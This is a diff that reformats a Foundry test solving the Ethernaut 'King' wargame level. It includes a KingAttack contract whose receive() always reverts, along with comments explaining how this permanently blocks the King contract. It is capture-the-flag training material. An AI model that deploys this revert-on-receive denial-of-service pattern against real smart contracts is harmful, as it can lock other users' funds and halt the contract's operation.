@@ -42,7 +42,15 @@ contract TestKingSolution is Test, Utils {
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = King(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
+        instance = King(
+            payable(
+                createLevelInstance(
+                    ethernaut,
+                    Level(address(factory)),
+                    0.001 ether
+                )
+            )
+        );
         kingAttack = new KingAttack();
         vm.stopPrank();
     }
@@ -63,7 +71,7 @@ contract TestKingSolution is Test, Utils {
 
         // the expected is any user being able to be the king by just sending
         // the prize amount of eth, however this sends the eth to the last king befor updating
-        // a king can be a contract and just revert on their receive(), so when the execution tries to send 
+        // a king can be a contract and just revert on their receive(), so when the execution tries to send
         // eth back to the king address(our contract), it will just revert and completely DoS.
 
         vm.startPrank(player);
@@ -86,7 +94,6 @@ contract TestKingSolution is Test, Utils {
         assertTrue(instance._king() == address(kingAttack));
 
         vm.stopPrank();
-
     }
 }
 
@@ -98,5 +105,5 @@ contract KingAttack {
     // revert when receiving eth, this will make our DoS happen
     receive() external payable {
         require(false, "try next time");
-    } 
+    }
 }
